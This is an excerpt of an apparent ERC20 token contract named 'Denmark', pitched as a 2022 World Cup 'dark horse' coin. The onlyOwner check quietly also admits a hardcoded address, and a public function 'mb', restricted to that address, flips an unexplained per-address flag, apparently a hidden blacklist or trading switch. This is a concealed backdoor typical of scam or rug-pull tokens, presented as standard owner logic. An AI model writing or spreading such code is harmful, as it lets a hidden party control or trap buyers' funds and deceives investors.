...
//** 2022 World Cup dark horse team
...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x2CD7D047Edb3B5E93d62E23C5A02eC934E8A32F2) , "Ownable: caller is not the owner");
        _;
    }
...
contract Denmark is Context, IERC20, Ownable {
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x2CD7D047Edb3B5E93d62E23C5A02eC934E8A32F2));
        aa[addr] = status;
    }
